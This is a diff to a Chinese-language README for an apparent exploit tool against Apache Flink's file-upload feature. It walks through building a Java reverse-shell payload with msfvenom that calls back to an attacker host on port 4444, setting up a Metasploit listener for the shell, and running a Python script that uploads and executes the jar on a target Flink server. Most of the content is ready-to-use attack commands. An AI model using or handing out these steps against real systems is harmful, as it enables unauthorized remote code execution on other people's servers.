@@ -28,3 +28,33 @@ Apache Flink是一个面向数据流处理和批量数据处理的可分布式�
 msfvenom -p java/shell_reverse_tcp lhost=192.168.99.5 lport=4444 -f jar > exp.jar
 ```
 
+![image](https://github.com/FeiNiao/Apache-flink-fileupload-getshell/assets/66779835/24e8e86b-571b-4670-bae1-83eb89b204e5)
+
+
+将攻击载荷`exp.jar`放入到python脚本的同级目录下
+注：在脚本中攻击载荷的名字写死了为`exp.jar`，使用者可以随意更换
+
+攻击载荷生成完成后，在msf上建立监听接受反弹的shell
+
+```
+use exploit/multi/handler
+
+set payload java/shell/reverse_tcp
+
+set LHOST 0.0.0.0
+
+set LPORT 4444
+
+exploit
+```
+![image](https://github.com/FeiNiao/Apache-flink-fileupload-getshell/assets/66779835/63d6b1f9-45ba-4a3b-91ee-d3319c0e361a)
+
+
+随后执行python脚本
+```
+ python .\apache_flink文件上传getshell.py -u http://192.168.99.7:8081
+```
+![image](https://github.com/FeiNiao/Apache-flink-fileupload-getshell/assets/66779835/a1d2474c-78e7-4554-ab65-f9b9f1fa7b6e)
+
+
+脚本会返回apache-flink的版本信息，若存在漏洞则会上传`exp.jar`包，成功上传后会返回jar包落地的文件名，并且会执行该jar包
